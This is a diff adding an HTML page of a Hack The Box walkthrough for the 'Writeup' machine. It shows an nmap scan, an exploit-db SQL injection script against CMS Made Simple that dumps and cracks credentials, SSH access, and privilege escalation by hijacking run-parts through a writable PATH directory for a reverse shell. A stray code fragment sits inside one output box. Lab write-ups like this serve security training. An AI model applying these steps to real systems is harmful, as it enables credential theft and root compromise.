@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <!-- JavaScript Sources -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/modaltoc.js"></script>
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" type="text/css" href="/css/navigation.css">
+    <link rel="stylesheet" type="text/css" href="/css/main.css">
+    <link rel="stylesheet" href="/css/tocbot.css">
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+</head>
+<body>    
+    <div class="left-navigation">
+        <div class="nav-buttons">
+           <button onclick="window.location.href = '/about.html';">About</button>
+           <button class="accordion">Write-ups</button>
+           <div class="panel">
+             <ul>
+               <li><button onclick="window.location.href = '/machines.html';">Machines</button></li>
+               <li><button onclick="window.location.href = '/pwn.html';">Pwn</button></li>
+             </ul>
+           </div>
+           <button onclick="window.location.href = ' /resources.html';">Resources</button>
+	   <button onclick="window.location.href = '/index.html';">Home</button>
+        </div>
+	<div class="contact">
+	    <div class="contact">
+ 		<p>Contact:<br>
+		   Adrian Curtean<br>
+	   	   555-555-5555<br>
+		   <a href="mailto:acurtean@asu.edu?Subject=Hey">acurtean@asu.edu</a>
+  	        </p>
+	    </div>
+	</div>
+    </div>
+    <div id="fadewrapper">
+	<div class="page-content">
+	    <div class="heading">
+		<div class="heading-text" id="0">HtB - Writeup</div>
+	 	<img src="/images/writeup/writeup.jpeg" alt="machine logo">
+            </div>
+	    <div class="subheading">
+		<h3 id="1">Initial Recon</h3>
+	    </div>
+	    <p class="writeup-text">We always begin the initial recon phase with an nmap scan.</p>
+	    <code class="codebox">root@kali:~# nmap -sC -sV 10.10.10.138
+		Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-08 15:10 EDT
+		Nmap scan report for 10.10.10.138
+		Host is up (0.048s latency).
+		Not shown: 998 filtered ports
+		PORT   STATE SERVICE VERSION
+		22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+		| ssh-hostkey: 
+		|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
+		|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+		|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+		80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+		| http-robots.txt: 1 disallowed entry 
+		|_/writeup/
+		|_http-server-header: Apache/2.4.25 (Debian)
+		|_http-title: Nothing here yet.
+		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+		Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds
+	    </code>
+	    <p class="writeup-text">We see from the output that there is a webserver running on port 80 as well as SSH available
+  	    on port 22.</p>
+	    <div class="subheading">
+	        <h3 id="2">Port 80 Enumeration</h3>
+	    </div>
+	    <p class="writeup-text">The homepage states that the website is unfinished and that the webserver is protected from 
+	    DoS. Due to the DoS protection, we can not bruteforce directories without having our IP address blacklisted.</p>	 
+	    <img class="writeup-img" src="/images/writeup/webindex.png" alt="Index page">
+	    <p class="writeup-text">Let's go ahead and check out the /writeup/ directory that nmap found for us.</p>
+	    <img class="writeup-img" src="/images/writeup/web2.png" alt="/writeup/ page">
+	    <p class="writeup-text">Again, not a whole lot to go off of here. We can check the linked pages for directory traversal 
+	    and local file inclusion attacks but we won't get anything. Let's check the source to see if we can find some more 
+	    information about the webserver.</p>
+	    <img class="writeup-img" src="/images/writeup/source.png" alt="/writeup/ source">
+	    <p class="writeup-text">We can see that the CMS for the webserver is CMS Made Simple. Using our good friend 
+	    exploit-db.com, we find a <a href="https://www.exploit-db.com/exploits/46635">python script</a> that will 
+	    automagically perform a bruteforce SQL injection attack and retrieve both a username and a password for us!</p>
+    	    <div class="subheading">
+                <h3 id="3">SQL Injection + user.txt</h3>
+            </div>
+            <code class="codebox">root@kali:~/HTB/Writeup# python cmsmsexploit.py -u http://10.10.10.138/writeup -w /usr/share/wordlists/rockyou.txt
+			
+  window.onclick = function(ev
+		[+] Salt for password found: 5a599ef579066807
+		[+] Username found: jkr
+		[+] Email found: jkr@writeup.htb
+		[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+		[+] Password cracked: raykayjay9
+	    </code>
+ 	    <p class="writeup-text"><strong>NOTE:</strong>You may have to play around with the TIME variable in the script to get useful output. A 
+	    value of 4 worked for me.</p>
+	    <p class="writeup-text"><strong>NOTE 2:</strong>If you receive a <code>ImportError: No module named termcolor</code> error, you can fix 
+	    it by running <code>pip install termcolor</code></p>
+	    <p class="writeup-text">Remembering back to our initial nmap scan, we can use the found credential pair to SSH into the machine as the 
+	    jkr user and grab the user flag.</p>
+	    <code class="codebox">root@kali:~# ssh jkr@10.10.10.138
+		jkr@10.10.10.138's password: 
+		Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
+
+		The programs included with the Devuan GNU/Linux system are free software;
+		the exact distribution terms for each program are described in the
+		individual files in /usr/share/doc/*/copyright.
+
+		Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+		permitted by applicable law.
+		Last login: Tue Mar 24 17:29:32 2020 from 10.10.14.27
+		jkr@writeup:~$ cat user.txt 
+		d4e49...
+	    </code>
+	    <div class="subheading">
+		<h3 id="4">Privilege Escalation + root.txt</h3>
+	    </div>
+	    <p class="writeup-text">We can utilize our python3 http.server to transfer <a href="https://github.com/DominicBreuker/pspy">pspy64</a> 
+	    to the target and monitor processes. We discover that for each successful SSH login, a command is run as the root user.</p>
+	    <img class="writeup-img" src="/images/writeup/pspy64.png" alt="pspy64 output">
+	    <p class="writeup-text">At this point, we should check to see where our user has write privileges to see if we can overwrite run-parts. 
+	    We would check this because run-parts is being called using a relative path rather than an absolute path.</p>
+	    <img class="writeup-img" src="/images/writeup/writable.png" alt="writable directories">
+	    <p class="writeup-text">Interestingly, we have write access to <code>/usr/local/bin</code>. We see from the pspy64 output that 
+	    <code>/usr/local/bin</code> comes before <code>/bin</code> in the PATH environment variable. Due to the way that linux searches for 
+	    binaries when a command is executed, even though the <code>bin-parts</code> binary exists within <code>/bin</code>, we can place a 
+	    malicious file within <code>/usr/local/bin</code> and have it executed instead. The next step is to write our reverse shell code into a 
+	    file called <code>run-parts</code> within the <code>/usr/local/bin</code> directory.</p>
+  	    <img class="writeup-img" src="/images/writeup/writing.png" alt="echo exploit code">
+	    <p class="writeup-text">All that is left to do is setup our netcat listener and SSH back in to trigger the running of our malicious 
+	    <code>run-parts</code>.</p>
+	    <img class="writeup-img" src="/images/writeup/root.png" alt="root exploit and root.txt">
+        </div>
+	<!-- The Modal -->
+	<div id="myModal" class="modal">
+
+        <!-- The Close Button -->
+        <span class="close" onclick="document.getElementById('myModal').style.display='none'">&times;</span>
+
+        <!-- Modal Content (The Image) -->
+        <img class="modal-content" id="img01">
+
+        <!-- Modal Caption (Image Text) -->
+        <div id="caption"></div>
+        </div>
+    </div>
+	<div class="right-navigation">
+   	   <div class="js-toc"></div>
+	</div>
+</body>
+</html>
